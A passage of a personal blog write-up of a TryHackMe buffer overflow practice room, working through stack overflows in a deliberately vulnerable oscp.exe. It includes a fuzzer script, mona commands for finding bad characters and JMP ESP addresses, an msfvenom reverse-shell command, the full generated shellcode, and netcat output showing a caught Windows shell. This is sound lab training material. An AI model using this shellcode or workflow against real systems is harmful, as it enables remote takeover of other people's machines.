<p>With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn&rsquo;t change it).</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ nc -lvp <span style="color:#ae81ff">4444</span> 
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</code></pre></div><blockquote>
<p>Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!</p>
</blockquote>
<p>I&rsquo;m doing something wrong since I&rsquo;m not getting any reverse shell at all, and the debugger is also showing an error&hellip;</p>

    <img src="../img/b6e0045aff939d2b636b1e8949f88c63.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>Time to recheck everything to try and find the problem. Maybe we picked a wrong address&hellip;</p>
<p>I&rsquo;m failing at locating the problem with all this. Will have to pick up tomorrow, it is 3:32AM already. Tomorrow we&rsquo;ll troubleshoot this.</p>
<p>[Off to bed.] =&gt; [zZZzzzZZZZzz] =&gt; [The next morning]</p>
<p>Ok let&rsquo;s try to figure out what went wrong with all the steps we did, since we were unable to get the reverse shell connection we assume we did something wrong at some point.</p>
<p>Turns out I did a poor job at identifying the badchars. It seems not all of them were indeed bad:</p>
<p>These were the chars we found before:</p>
<p><code>00 07 08 2e 2f a0 a1</code></p>
<p>If we do it right this time, which means testing each bad char to actually verfiy which are indeed bad. We reduce the list to this:</p>
<p><code>07 2e a0</code></p>
<p>So now we need to fix and update Mona&rsquo;s bytearray:</p>
<p><code>!mona bytearray -b &quot;\x00\x07\x2e\xa0&quot;</code></p>
<p>We also need to fix the payload we created with MSFVENOM:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bufferOverflowPrep<span style="color:#f92672">]</span>
└─$ msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>thread -b <span style="color:#e6db74">&#34;\x00\x07\x2e\xa0&#34;</span> -f py   
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
Found <span style="color:#ae81ff">11</span> compatible encoders
Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">351</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">351</span>
Payload size: <span style="color:#ae81ff">351</span> bytes
Final size of py file: <span style="color:#ae81ff">1712</span> bytes
buf <span style="color:#f92672">=</span>  b<span style="color:#e6db74">&#34;&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xbb\xd4\x93\xce\xb2\xda\xdb\xd9\x74\x24\xf4\x5e\x29&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xc9\xb1\x52\x31\x5e\x12\x03\x5e\x12\x83\x12\x97\x2c&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x47\x66\x70\x32\xa8\x96\x81\x53\x20\x73\xb0\x53\x56&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xf0\xe3\x63\x1c\x54\x08\x0f\x70\x4c\x9b\x7d\x5d\x63&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x2c\xcb\xbb\x4a\xad\x60\xff\xcd\x2d\x7b\x2c\x2d\x0f&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xb4\x21\x2c\x48\xa9\xc8\x7c\x01\xa5\x7f\x90\x26\xf3&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x43\x1b\x74\x15\xc4\xf8\xcd\x14\xe5\xaf\x46\x4f\x25&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x4e\x8a\xfb\x6c\x48\xcf\xc6\x27\xe3\x3b\xbc\xb9\x25&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x72\x3d\x15\x08\xba\xcc\x67\x4d\x7d\x2f\x12\xa7\x7d&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xd2\x25\x7c\xff\x08\xa3\x66\xa7\xdb\x13\x42\x59\x0f&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xc5\x01\x55\xe4\x81\x4d\x7a\xfb\x46\xe6\x86\x70\x69&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x28\x0f\xc2\x4e\xec\x4b\x90\xef\xb5\x31\x77\x0f\xa5&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x99\x28\xb5\xae\x34\x3c\xc4\xed\x50\xf1\xe5\x0d\xa1&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x9d\x7e\x7e\x93\x02\xd5\xe8\x9f\xcb\xf3\xef\xe0\xe1&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x44\x7f\x1f\x0a\xb5\x56\xe4\x5e\xe5\xc0\xcd\xde\x6e&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x10\xf1\x0a\x20\x40\x5d\xe5\x81\x30\x1d\x55\x6a\x5a&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x92\x8a\x8a\x65\x78\xa3\x21\x9c\xeb\xc6\xb8\x9e\xc9&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xbe\xc0\x9e\x1c\x63\x4c\x78\x74\x8b\x18\xd3\xe1\x32&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x01\xaf\x90\xbb\x9f\xca\x93\x30\x2c\x2b\x5d\xb1\x59&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x3f\x0a\x31\x14\x1d\x9d\x4e\x82\x09\x41\xdc\x49\xc9&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x0c\xfd\xc5\x9e\x59\x33\x1c\x4a\x74\x6a\xb6\x68\x85&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xea\xf1\x28\x52\xcf\xfc\xb1\x17\x6b\xdb\xa1\xe1\x74&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x67\x95\xbd\x22\x31\x43\x78\x9d\xf3\x3d\xd2\x72\x5a&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xa9\xa3\xb8\x5d\xaf\xab\x94\x2b\x4f\x1d\x41\x6a\x70&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x92\x05\x7a\x09\xce\xb5\x85\xc0\x4a\xd5\x67\xc0\xa6&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x7e\x3e\x81\x0a\xe3\xc1\x7c\x48\x1a\x42\x74\x31\xd9&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x5a\xfd\x34\xa5\xdc\xee\x44\xb6\x88\x10\xfa\xb7\x98&#34;</span>
</code></pre></div><p>And then we need to updated this new payload in the exploit script. Then we restart Immunity Debugger, oscp.exe and you know the rest&hellip;</p>
<p>Let&rsquo;s try to run the exploit again. Remember to have a netcat listener on port 4444 ready:</p>
<p>SPOILER ALERT!: That didn&rsquo;t work either, and you know why? Because I also fucked it up with the JMP address:</p>
<p><code>retn = &quot;fa110526&quot;</code> (what I noob I am, I know  😄 )</p>
<p>Little I knew about the address format we should be using, it turns out its not enough with just &ldquo;reversing&rdquo; the digits (I even did that wrong  😆), you need to format it as an address and Little indian:</p>
<ul>
<li>So this is the address <code>625011AF</code></li>
<li>and we format it as follows: <code>\xaf\x11\x50\x62</code></li>
</ul>
<p>Now let&rsquo;s update our exploit with the correct address this time (yup, I&rsquo;m learning. I embrace mistakes XD).</p>
<p>[Takes a deep breath] Ok, let&rsquo;s restart everything and run the exploit again:</p>
<p>it worked!! The program did not crash this time:</p>

    <img src="../img/buffOverflow1_win1.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>And we got our reverse shell back!:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ nc -lnvp <span style="color:#ae81ff">4444</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
connect to <span style="color:#f92672">[</span>10.13.0.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.221.158<span style="color:#f92672">]</span> <span style="color:#ae81ff">49267</span>
Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.

C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>dmin<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\v</span>ulnerable-apps<span style="color:#ae81ff">\o</span>scp&gt;
</code></pre></div><p>With this we can access the room questions!</p>
<blockquote>
<p>Question #1 What is the EIP offset for OVERFLOW1?</p>
</blockquote>
<p>We got that one a while back, the offset we found <strong>1978</strong>.</p>
<blockquote>
<p>Question #2: In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1?</p>
</blockquote>
<p>We got those already, after I fucked it up I know. <code>&quot;\x00\x07\x2e\xa0&quot;</code></p>
<p>That&rsquo;s it for <strong>OVERFLOW1</strong>!</p>
<p>For the rest of the room we basically need to repeat the same process but for each OVERFLOW command. This time trying to avoid messing up things XD</p>
<h2 id="task-2---oscpexe---overflow2">TASK 2 - [oscp.exe - OVERFLOW2]</h2>
<p>Before we start doing anything let&rsquo;s turn on the volume  and play the track for this OVERFLOW2 section!</p>
<blockquote>
<p><strong>Vulfpeck</strong> - <strong>Disco Ulysses</strong>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/F7nCDrf90V8" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

Crank that volume up!</p>
</blockquote>
<p>[Almost two days later  😜 ]</p>
<p>I took some time off this to learn a bit more about buffer overlows as it started to feel like I knew less than before at some point. Anyways, we are back. I&rsquo;ll point to some resources I found useful when I was trying to understand this stuff:</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo">https://www.youtube.com/watch?v=1S0aBV-Waeo</a></li>
<li><a href="https://youtu.be/j7AEzGKuKUU">https://youtu.be/j7AEzGKuKUU</a></li>
<li><a href="https://www.youtube.com/watch?v=qSnPayW6F7U&amp;list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G">https://www.youtube.com/watch?v=qSnPayW6F7U&amp;list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G</a></li>
</ul>
<p>While we enjoy Joe Dart&rsquo;s groove, let&rsquo;s start with the second OVERFLOW command! so we can answer the following two questions:</p>
<blockquote>
<p>Question #1: What is the EIP offset for OVERFLOW2?</p>
</blockquote>
<blockquote>
<p>Question #2: In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2?</p>
</blockquote>
<p>We need to basically recreate the same process we followed for the first overflow. Let&rsquo;s outline that process to recall all parts:</p>
<ol>
<li>We Fuzz the executable.</li>
<li>We crash the app and get control of the EIP.</li>
<li>We locate the bad characters</li>
<li>We find and select a Jump Point</li>
<li>We then generate our payload code</li>
<li>We make sure to add our NOP sleds.</li>
<li>We exploit.</li>
</ol>
<h3 id="lets-fuzz">Let&rsquo;s fuzz</h3>
<p>Let&rsquo;s grab a copy of that fuzzer script from the previous task. We need to update the following things: <code>IP</code>, <code>Prefix</code>. Note: <em>Instead of having the prefix hardcoded we have it in a variable so we can rehuse faster for the next set of overflow tasks.</em></p>
<p>In my case it looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> sys

ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.98.134&#34;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>

buffer <span style="color:#f92672">=</span> []
counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
step <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>
prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW2 &#34;</span>
<span style="color:#66d9ef">while</span> len(buffer) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">30</span>:
    buffer<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> counter)
    counter <span style="color:#f92672">+=</span> step

<span style="color:#66d9ef">for</span> string <span style="color:#f92672">in</span> buffer:
    <span style="color:#66d9ef">try</span>:
        s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
        s<span style="color:#f92672">.</span>settimeout(timeout)
        connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((ip, port))
        s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
        print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> bytes&#34;</span> <span style="color:#f92672">%</span> len(string))
        s<span style="color:#f92672">.</span>send( prefix <span style="color:#f92672">+</span> string <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
        s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
        s<span style="color:#f92672">.</span>close()
    <span style="color:#66d9ef">except</span>:
        print(<span style="color:#e6db74">&#34;Could not connect to &#34;</span> <span style="color:#f92672">+</span> ip <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> str(port))
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</code></pre></div><p>We RDP into the machine once deployed and do the same old. Start Immunity, open oscp.exe and unpause the execution.</p>
<p>We run the script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bufferOverflowPrep<span style="color:#f92672">]</span>
└─$ python overflow2_fuzz.py 
Fuzzing with <span style="color:#ae81ff">50</span> bytes
Fuzzing with <span style="color:#ae81ff">100</span> bytes
Fuzzing with <span style="color:#ae81ff">150</span> bytes
Fuzzing with <span style="color:#ae81ff">200</span> bytes
Fuzzing with <span style="color:#ae81ff">250</span> bytes
Fuzzing with <span style="color:#ae81ff">300</span> bytes
Fuzzing with <span style="color:#ae81ff">350</span> bytes
Fuzzing with <span style="color:#ae81ff">400</span> bytes
Fuzzing with <span style="color:#ae81ff">450</span> bytes
Fuzzing with <span style="color:#ae81ff">500</span> bytes
Fuzzing with <span style="color:#ae81ff">550</span> bytes
Fuzzing with <span style="color:#ae81ff">600</span> bytes
Fuzzing with <span style="color:#ae81ff">650</span> bytes
Could not connect to 10.10.98.134:1337
</code></pre></div><p>Right after 650 bytes it crashes. I&rsquo;ll run it one more time to see if 600 makes it crash. It did not, and instead crashed at 700. So let&rsquo;s say 650 is good.</p>
<h3 id="we-get-a-hold-of-the-eip">We get a hold of the EIP</h3>
<p>We need to generate a payload for our exploit script, we grab a copy of that script from the last task as well. Remember to update the prefix to <code>OVERFLOW2</code>.</p>
<p>We need our payload of 650 bytes but remember we need to add a bit of overhead let&rsquo;s add another 400 bytes. let&rsquo;s create that with the following command:</p>
<p><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1050</code></p>
<p>We use the ouput of that command to set the &lsquo;payload&rsquo; variable of our exploit script. Restart the debugger and such and we run our exploit script.</p>
<p>Once we run our script we should see the debugger stops the execution <code>Access Violation when executing [XXXXXXXX]</code></p>
<p>Now we need to run mona as follows: <code>!mona findmsp -distance 1050</code>:</p>
<blockquote>
<p>The findmsp command will find all instances or certain references to a cyclic pattern (a.k.a. “Metasploit pattern”) in memory, registers, etc This command has an important requirement : you have to use a cyclic pattern to trigger a crash in your target application. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">Link to the manual</a></p>
</blockquote>
<p><img src="https://i.imgur.com/aOyYQZ6.png" alt="We run findmsp command"></p>
<p>Remember we need to get the offset of EIP here, we are interested in the following line:</p>
<p><code>Log data, item 18 Address=0BADF00D Message=    EIP contains normal pattern : 0x76413176 (offset 634)</code>
We update the <code>offset</code> variable of our script with the value we found. Then we empty the <code>payload</code> variable and set our <code>retn</code> variable to the magic bees <code>BBBB</code>.</p>
<p>We save the changes to our script, restart everything again and run the exploit once more. We want proof we are overwritting our EIP correctly:</p>
<p><img src="https://i.imgur.com/FFIrEU9.png" alt="We managed to hit the EIP"></p>
<h3 id="we-test-for-bad-characters">We test for bad characters</h3>
<p>Now we need to look for bad characters. First we create a bytearray with Mona and by default we exclude the null byte: <code>!mona bytearray -b &quot;\x00&quot;</code>.</p>
<p>Then, using our byteArray generator script we create an identical bytearray. With that generated we set the <code>payload</code> variable to the bytearray generated.</p>
<p>We restart everything and run our expliot. This time we need to take note of the <code>ESP Register Address</code>.</p>
<p><img src="https://i.imgur.com/TMpxKad.png" alt="ESP Register Address"></p>
<p>Now we can use mona again to find the bad chars by comparison: <code>!mona compare -f C:\mona\oscp\bytearray.bin -a 01A1FA30</code></p>
<p><img src="https://i.imgur.com/ju1vkvu.png" alt="Bad Characters found"></p>
<p>So we get the following bad characters not including the null byte <code>23 24 3c 3d 83 84 ba bb</code>. This is where I messed up last time, I just assumed all values returned at this point were bad characters. We need to test them to avoid the same mistake.</p>
<p>Let&rsquo;s remove the first one <code>23</code> and see if the rest are still being returned by mona as Bad Chars. For the sake of any eventual reader, I&rsquo;ll do this without documenting every test. Just remove a badchar one by one from your payload, run and compare with mona. Be Aware that since we are modifying the payload the <code>ESP register</code> will point to a different <code>address</code> each time.</p>
<p><code>!mona compare -f C:\mona\oscp\bytearray.bin -a 0192FA30</code></p>
<ul>
<li>First Test: [ESP 0192FA30] 00 23 3c 3d 83 84 ba bb</li>
</ul>
<p>From this test we can observe that <code>24</code> was not a bad chard and was just affected by <code>23</code> being a bad char. From now on, we&rsquo;ll regenerate mona&rsquo;s bytearray and we&rsquo;ll remove the bad characters one by one to test they are really bad:</p>
<ul>
<li>Initial Set: [ESP 01A1FA30] 00 23 24 3c 3d 83 84 ba bb</li>
<li>First  Test: [ESP 0192FA30] 00 23 3c 3d 83 84 ba bb</li>
<li>Second Test: [ESP 018AFA30] 00 23 3c 83 84 ba bb</li>
<li>Third  Test: [ESP 019CFA30] 00 23 3c 83 ba bb</li>
<li>Fourth Test: [ESP 0196FA30] 00 23 3c 83 ba</li>
</ul>
<p>Final Mona bytearray: <code>!mona bytearray -b &quot;\x00\x23\x3c\x83\xba&quot;</code></p>
<p>There you have it, we&rsquo;ve narrow down all possible badchars until we get a list of the recurrent codes and when we compare in Mora again we get no more badchars.</p>
<p><img src="https://i.imgur.com/jTpAg3J.png" alt="No more badchars in mona">
It is safe to assume that these last codes <code>23 3c 83 ba</code> caused the ones that were initially returned along with them <code>24 3d 84 bb</code> to be marked as bad too. But We know now that is not always the case, we&rsquo;ve evolved a bit. And we start to value testing more. 😄</p>
<h3 id="finding-a-jump-point-1">Finding a Jump point</h3>
<p>Now we need to find ourselves a jump point, we do that with Mona and we also use the set of badchars we have identified: <code>!mona jmp -r esp -cpb &quot;\x00\x23\x3c\x83\xba&quot;</code></p>
<p>I&rsquo;ve selected the second address in the list this time:</p>
<p><img src="https://i.imgur.com/QKZrsXe.png" alt="Available JMP addresses"></p>
<p><code>Log data, item 10 Address=625011BB Message=  0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</code>
We use that address in our script inside the <code>retn</code> variable. Remember our second mistake from the first overflow practice. The address needs to be formatted as little endian. <code>\xbb\x11\x50\x62</code>.</p>
<h3 id="we-make-ourselves-a-payload">We make ourselves a payload</h3>
<p>We need a payload now, so we can reverse shell the hell out of this excercise. Using <strong>msfvenom</strong> we create the payload taking into account the set of bad chars:</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 EXITFUNC=thread -b &quot;\x00\x23\x3c\x83\xba&quot; -f py</code></p>
<p>We paste the output of msfvenom to the script and set <code>payload = buf</code>.</p>
<h3 id="we-add-some-nop-sleds">We add some NOP Sleds</h3>
<p>We are almost there, we just need to add some NOP sleds and we are golden (unless I already fucked it up at some point yet again).</p>
<h3 id="we-exploit">We exploit!</h3>
<p>We restart everything one last time (for this task at least), we need to fire up a netcat listener as well. When we run the exploit we get our rev shell connection!</p>
<p><img src="https://i.imgur.com/isGs6NQ.png" alt="We get reverse shell"></p>
<h2 id="straight-to-the-point">Straight to the point</h2>
<p>From here we&rsquo;ll just use the same process to resolve the rest of the OVERFLOW commands. I won&rsquo;t be documenting those since it&rsquo;ll end up being an <strong>INSANELY LARGE</strong> writeup. I think that having the process outlined and practiced twice should be enough for you and me to resolve the rest of the room. I&rsquo;ll just be listing the results below.</p>
<h3 id="task-3---oscpexe---overflow3">TASK 3 - [oscp.exe - OVERFLOW3]</h3>
<ul>
<li>OVERFLOW3 RESULTS:
<ul>
<li>[OFFSET 1XXX]</li>
<li>[BADCHARS 11 XX XX XX EE]</li>
</ul>
</li>
</ul>
<h3 id="task-4---oscpexe---overflow4">TASK 4 - [oscp.exe - OVERFLOW4]</h3>
<ul>
<li>OVERFLOW4 RESULTS:
<ul>
<li>[OFFSET 2XXX]</li>
<li>[BADCHARS XX XD XX]</li>
</ul>
</li>
</ul>
<h3 id="task-5---oscpexe---overflow5">TASK 5 - [oscp.exe - OVERFLOW5]</h3>
<ul>
<li>OVERFLOW5 RESULTS:
<ul>
<li>[OFFSET 3XX]</li>
<li>[BADCHARS XX 2F XX FX]</li>
</ul>
</li>
</ul>
<h3 id="task-6---oscpexe---overflow6">TASK 6 - [oscp.exe - OVERFLOW6]</h3>
<ul>
<li>OVERFLOW6 RESULTS:
<ul>
<li>[OFFSET XXX4]</li>
<li>[BADCHARS 08 XX XX]</li>
</ul>
</li>
</ul>
<h3 id="task-7---oscpexe---overflow7">TASK 7 - [oscp.exe - OVERFLOW7]</h3>
<ul>
<li>OVERFLOW7 RESULTS:
<ul>
<li>[OFFSET 1XX6]</li>
<li>[BADCHARS 8C XX XX XX]</li>
</ul>
</li>
</ul>
<h3 id="task-8---oscpexe---overflow8">TASK 8 - [oscp.exe - OVERFLOW8]</h3>
<ul>
<li>OVERFLOW8 RESULTS:
<ul>
<li>[OFFSET 1XX6]</li>
<li>[BADCHARS 1D XX XX XX]</li>
</ul>
</li>
</ul>
<h3 id="task-9---oscpexe---overflow9">TASK 9 - [oscp.exe - OVERFLOW9]</h3>
<ul>
<li>OVERFLOW9 RESULTS:
<ul>
<li>[OFFSET 1XX4]</li>
<li>[BADCHARS XX 3E XX EX]</li>
</ul>
</li>
</ul>
<p>Note: For this one I had to do a few tries to get <strong>all</strong> badchars.</p>
<h3 id="task-10---oscpexe---overflow10">TASK 10 - [oscp.exe - OVERFLOW10]</h3>
<ul>
<li>OVERFLOW9 RESULTS:
<ul>
<li>[OFFSET X37]</li>
<li>[BADCHARS A0 XX BE XX XX]</li>
</ul>
</li>
</ul>
<p>That was a <strong>LONG</strong> room to go through, I had to stop several times along the way just to study a bit about buffer overflows, make mistakes, debug and retrace steps. But eventually I was able to finish the room. I still feel I need to practice a lot for this process to cement. Good thing the <strong>Offensive Pentesting</strong> path in TryHackMe has a lot more of these rooms to shape those skills. Check it out <a href="https://tryhackme.com/path/outline/pentesting">here</a></p>
<p>I hope you somehow enjoy this post, I certainly had a lot of fun creating it!</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<br>
<div class="container center" style="margin:10px !important;  text-align: center!important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
    </div>
</div>

<div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "tzero86bits" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

        <div class="footer">
    Made with <a href="https://gohugo.io/">Hugo</a> based of
    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
    Noli umquam discere desinere.
</div>

    </div>
  </body>
</html>
